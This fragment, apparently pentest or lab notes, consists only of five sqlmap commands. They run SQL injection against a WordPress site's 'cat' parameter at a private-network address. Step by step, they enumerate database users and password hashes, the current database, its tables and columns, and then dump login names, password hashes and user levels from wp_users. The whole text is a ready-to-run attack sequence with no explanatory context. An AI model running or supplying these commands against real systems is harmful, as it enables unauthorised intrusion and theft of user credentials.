2
    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 --users --passwords
    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 --current-db
    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 -D wordpress --tables
    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 -D wordpress -T wp_users --columns
    sqlmap.py --url http://192.168.1.168/_PATH_/?cat=0 -D wordpress -T wp_users -C user_pass,user_login,user_level --dump
